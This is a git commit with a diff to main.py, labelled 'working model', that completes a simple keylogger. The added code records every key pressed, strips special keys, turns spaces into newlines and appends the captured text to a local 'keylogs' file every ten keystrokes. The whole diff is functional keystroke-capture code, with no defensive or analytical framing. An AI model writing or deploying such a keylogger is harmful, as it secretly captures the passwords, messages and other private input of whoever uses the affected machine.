2b607abb0d07ce096d0774eb7ad693f8dc9dff6d
thedoodler <ramprakashsmail@gmail.com>
2020-11-02 13:49:01 +0530

    working model

--- main.py
+++ main.py
@@ -6,9 +6,25 @@ count = 0
 keys = []
 
 
+def file_writer(keys):
+    with open("keylogs","a") as logfile:
+        for key in keys:
+            k = str(key).replace("\'","")
+            if k == "Key.space":
+                logfile.write('\n')
+            elif k.find("Key") == -1:
+                logfile.write(k)
+
 def pressed(key):
     global keys, count
+    keys.append(key)
+    count += 1
     print(key, "pressed")
+
+    if count>= 10:
+        count = 0
+        file_writer(keys)
+        keys = []
 
 def released(key):
     if key==Key.esc:
